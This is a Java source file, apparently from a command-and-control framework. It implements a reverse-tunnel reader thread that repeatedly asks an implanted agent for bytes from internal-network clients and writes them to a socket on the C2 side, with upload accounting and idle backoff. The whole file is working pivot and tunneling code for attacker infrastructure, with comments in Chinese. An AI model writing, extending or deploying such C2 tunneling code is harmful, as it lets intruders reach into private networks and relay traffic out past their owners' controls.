package org.leo.core.engine.reverse;

import org.leo.core.agent.capability.ComponentInvokeCapable;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

/**
 * 从 agent 端读数据 → 写到 C2 本地 socket（forwardHost:forwardPort）。
 * 即"agent accept 到的内网客户端发来的字节"流向"C2 侧目标服务"。
 */
class ReverseReadThread implements Runnable {

    private static final Logger logger = LoggerFactory.getLogger(ReverseReadThread.class);

    private final ReverseTunnelServer server;
    private final Socket localSocket;
    private final String connId;

    ReverseReadThread(ReverseTunnelServer server, Socket localSocket, String connId) {
        this.server = server;
        this.localSocket = localSocket;
        this.connId = connId;
    }

    public void run() {
        ComponentInvokeCapable agent = server.getAgentNode();
        long idleDelay = 50L;
        while (server.isRunning() && !localSocket.isClosed()) {
            try {
                Map<String, Object> params = new HashMap<String, Object>();
                params.put("op", Integer.valueOf(ReverseTunnelServer.OP_READ));
                params.put("connId", connId);
                Map<String, Object> response = agent.invokeComponent("ReverseTunnelComponent", params);
                int code = ReverseTunnelServer.responseCode(response);
                if (code == 200) {
                    Object value = response.get("data");
                    if (!(value instanceof byte[])) {
                        throw new IOException("agent READ returned invalid data");
                    }
                    byte[] data = (byte[]) value;
                    if (data.length > 0) {
                        localSocket.getOutputStream().write(data);
                        localSocket.getOutputStream().flush();
                        server.recordUpload(connId, data.length);
                        idleDelay = 50L;
                        continue;
                    }
                } else if (code != 204) {
                    throw new IOException("agent READ failed: code=" + code);
                }
                Thread.sleep(idleDelay);
                idleDelay = Math.min(idleDelay * 2, 800L);
            } catch (Exception error) {
                if (server.isRunning()) {
                    logger.debug("反向隧道读循环异常: connId={} {}", connId, error.getMessage());
                }
                return;
            }
        }
    }
}
